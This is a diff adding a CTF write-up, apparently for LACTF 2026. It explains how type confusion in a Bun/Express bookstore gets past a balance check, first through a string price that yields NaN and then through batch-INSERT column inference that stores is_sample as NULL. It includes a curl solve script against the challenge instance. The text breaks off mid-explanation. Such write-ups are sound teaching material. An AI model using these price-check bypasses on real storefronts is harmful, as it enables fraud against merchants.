@@ -1,13 +1,276 @@
 ---
 title: "Narnes and Bobles & Bobles and Narnes"
 date: 2026-02-08
+tags: ["bun", "type-confusion", "javascript", "sqlite"]
+topics: ["web"]
+summary: "Two type confusion bugs in a Bun bookstore: string price NaN trick, then batch INSERT column inference."
 releaseDate: "2026-02-09"
 ctfs: ["lactf-26"]
 difficulty: medium
 draft: false
-showTableOfContents: false
-excludeFromSearch: true
-summary: "Early access — password required"
 ---
 
-{{< encrypted data="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" hash="451da89da8060807914012b7cab71f70a28c9cbe9cfa603f8a74fb2b601a9a8d" >}}
+> I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon.  
+> I dove deep and delivered results.
+
+> The bobler
+
+---
+
+Two challenges, same bookstore. You start with $1000 and need to buy a flag that costs $1,000,000. The original "Narnes and Bobles" had a type confusion bug in a book price (string instead of number). The revenge "Bobles and Narnes" fixes that specific bug, but the same codebase has a second, subtler flaw: Bun SQL's `db()` helper infers INSERT columns from the *first* object in a batch, silently dropping keys that only appear in later objects.
+
+---
+
+## The application
+
+The server is a Bun + Express bookstore backed by an in-memory SQLite database. Users register, get a $1000 balance, and can add books to their cart and check out. The checkout endpoint zips up the purchased files and sends them as a download.
+
+Four books are available:
+
+| Book | Price |
+|---|---|
+| The Part-Time Parliament | $10 |
+| The End of Cryptography | $20 |
+| AVDestroyer Origin Lore | $40 |
+| Flag | $1,000,000 |
+
+Each book has a "sample" variant (a preview file) and the full version. Sample items are free; full items cost their listed price.
+
+The cart table stores items with three columns:
+
+```sql
+CREATE TABLE cart_items (
+  username TEXT,
+  book_id TEXT,
+  is_sample INT,
+  ...
+);
+```
+
+---
+
+## The price check
+
+When adding products to the cart, `/cart/add` performs a balance check. This is the critical code path:
+
+```js
+app.post('/cart/add', needsAuth, async (req, res) => {
+  const productsToAdd = req.body.products;
+
+  const [{ balance }] = await db`SELECT balance FROM users WHERE username=${res.locals.username}`;
+  const [{ cartSum }] = await db`
+    SELECT SUM(books.price) AS cartSum
+    FROM cart_items
+    JOIN books ON books.id = cart_items.book_id
+    WHERE cart_items.username = ${res.locals.username} AND cart_items.is_sample = 0
+  `;
+
+  const additionalSum = productsToAdd
+    .filter((product) => !+product.is_sample)
+    .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
+    .reduce((l, r) => l + r, 0);
+
+  if (additionalSum + cartSum > balance) {
+    return res.json({ err: 'too poor, have you considered geting more money?' })
+  }
+
+  const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
+  await db`INSERT INTO cart_items ${db(cartEntries)}`;
+  // ...
+});
+```
+
+The check works in two parts:
+1. **SQL sum**: tallies prices of non-sample items *already in the cart* (`WHERE is_sample = 0`)
+2. **JS sum**: tallies prices of non-sample items *being added now* (`.filter((product) => !+product.is_sample)`)
+
+If the total exceeds the user's balance, the request is rejected. Otherwise, the products are inserted into the database.
+
+---
+
+## How checkout determines which file to serve
+
+At checkout, the server reads each cart item and decides whether to serve the full file or the sample:
+
+```js
+const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
+const content = await Bun.file('books/' + path).bytes();
+```
+
+If `is_sample` is truthy, you get `flag_sample.txt`. If falsy, you get `flag.txt` (the real flag). Importantly, checkout has **no price validation**. It just deducts from your balance (which can go negative) and serves the files.
+
+So the goal is clear: get the flag book into your cart with `is_sample` stored as a falsy value in the database, while somehow passing the price check during add.
+
+---
+
+## The original bug (narnes-and-bobles)
+
+In the original challenge, the first book's price in `books.json` was a *string*:
+
+```json
+{ "id": "a3e33c2505a19d18", "title": "The Part-Time Parliament", "price": "10" }
+```
+
+All other prices were numbers. This created a type confusion in the `reduce` operation.
+
+When you add both the Parliament book and the flag in one request, the reduce processes them left to right with initial value `0`:
+
+```
+Step 1: 0 + "10"      = "010"         (number + string = string concatenation!)
+Step 2: "010" + 1000000 = "0101000000"  (still concatenating)
+```
+
+Now `additionalSum` is the string `"0101000000"`. The balance check becomes:
+
+```js
+"0101000000" + null > 1000
+// "0101000000null" > 1000
+// NaN > 1000
+// false  <-- check passes!
+```
+
+The string can't be parsed as a number, so JavaScript coerces it to `NaN`. And `NaN > anything` is always `false`. The price check silently passes for any amount.
+
+### Solve (narnes-and-bobles)
+
+```sh
+TARGET="https://narnes-and-bobles-XXXXX.instancer.lac.tf"
+USER="solve_$(date +%s)"
+
+curl -s -c /tmp/cookies.txt -X POST "$TARGET/register" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=${USER}&password=pass"
+
+# Parliament (string price) first, then flag -- order matters for reduce
+curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/add" \
+  -H "Content-Type: application/json" \
+  -d '{"products": [{"book_id": "a3e33c2505a19d18", "is_sample": 0}, {"book_id": "2a16e349fb9045fa", "is_sample": 0}]}'
+
+curl -s -b /tmp/cookies.txt -X POST "$TARGET/cart/checkout" -o /tmp/solve.zip
+unzip -p /tmp/solve.zip flag.txt
+```
+
+---
+
+## What the revenge changed
+
+The fix is exactly one line. In `books.json`:
+
+```diff
+-    "price": "10"
++    "price": 10
+```
+
+The string price becomes a proper number. Now the reduce always produces a numeric sum, and the `NaN` trick no longer works. The flag's price of 1,000,000 correctly exceeds the $1000 balance, and the check rejects it.
+
+Everything else in the codebase is identical (aside from some debug `console.log` statements).
+
+---
+
+## Finding the new bug
+
+The insert at the end of `/cart/add` uses Bun SQL's tagged template helper:
+
+```js
+const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));
+await db`INSERT INTO cart_items ${db(cartEntries)}`;
+```
+
+The `db(cartEntries)` call takes an array of objects and generates a batch INSERT statement. To do this, it needs to decide which columns to include. Bun's implementation infers the column list from the **keys of the first object in the array**.
+
+This means: if the first object is `{ book_id: "abc", username: "me" }` (no `is_sample` key), the generated SQL is:
+
+```sql
+INSERT INTO cart_items (book_id, username) VALUES (?, ?), (?, ?)
+```
+
+The `is_sample` column is simply absent from the INSERT. SQLite fills it with NULL for *every* row, regardless of whether later objects in the array had an `is_sample` property.
+
